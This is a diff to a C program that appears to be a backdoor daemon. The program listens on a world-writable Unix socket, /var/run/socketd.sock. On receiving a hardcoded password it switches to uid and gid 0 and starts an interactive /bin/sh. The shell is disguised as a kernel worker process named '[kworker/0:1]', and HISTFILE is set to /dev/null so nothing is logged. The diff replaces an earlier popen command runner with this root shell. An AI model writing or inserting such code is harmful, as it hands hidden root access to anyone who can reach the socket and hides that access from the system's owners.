@@ -18,6 +18,9 @@
 #include <sys/types.h>
 #include <sys/wait.h>
 
+// chmod
+#include <sys/stat.h>
+
 // http://www.gnu.org/software/libc/manual/html_node/Local-Socket-Example.html#Local-Socket-Example
 int
 make_named_socket (const char *filename)
@@ -66,13 +69,13 @@ void fuck(int client_sock)
 		exit(1);
 	}
 
-	int auth = 0;
 	int read_size;
 	char client_message[2000];
 	FILE *fp;
 	char path[256];
 	char *pass = "knock knock m0therfucker";
-
+	
+	setsid();
 	dup2(client_sock, STDIN_FILENO);
 	dup2(client_sock, STDOUT_FILENO);
 	dup2(client_sock, STDERR_FILENO);
@@ -80,28 +83,15 @@ void fuck(int client_sock)
 	while((read_size = recv(client_sock, client_message, 2000, 0)) > 0)
 	{
 		strtok(client_message, "\n");
-		if (auth == 0) {
-			if (! strcmp(pass, client_message)) {
-				auth = 666;
-				printf("[READY] uid=%d gid=%d\n", getuid(), getgid());
-			}
-		}
-
-		if (auth == 666) {
-			char *boffer = strcat(client_message, " 2>&1");
-			strtok(boffer, "\n");
-
-			fp = popen(boffer, "r");
-
-			if (fp == NULL) {
-				perror("null fp");
-				exit(1);
-			}
-			else {
-				while (fgets(path, sizeof(path), fp) != NULL){
-					printf("%s", path);
-			}
-		}
+		if (! strcmp(pass, client_message)) {
+			printf("[READY] uid=%d gid=%d\n", getuid(), getgid());
+			setuid(0);
+			setgid(0);
+			char const *args[] = { "[kworker/0:1]", "-i", NULL };
+			char const *env[]  = { "HISTFILE=/dev/null", "SAVEHIST=",
+			                       "PS1=\n[$(whoami)@$(hostname)]:$(pwd)\\$ ",
+			                       "LANG=en_US.UTF-8", NULL };
+			execve("/bin/sh", (char **)args, (char **)env);
 		}
 	}
 	if(read_size == 0)
@@ -114,6 +104,8 @@ void fuck(int client_sock)
 		perror("recv failed");
 		exit(1);
 	}
+	printf("closing client sock: %d: bye bye", client_sock);
+	close(client_sock);
 	exit(0);
 }
 
@@ -125,7 +117,9 @@ int main(int argc , char *argv[])
 	int c = sizeof(struct sockaddr_un);
 	char *sockname = "/var/run/socketd.sock";
 	unlink(sockname);
+
 	int server = make_named_socket(sockname);
+	chmod(sockname, 00666);
 
 	if (listen(server, 3) != 0) {
 		perror("listen");
@@ -155,6 +149,7 @@ int main(int argc , char *argv[])
 		else{
 			int status;
 			printf("main(): had a baby called: pid %d\n", pid);
+			//close(client_sock);
 /*			
 			(void)waitpid(pid, &status, 0);
 			printf("main(): child’s status: is %d\n", status);
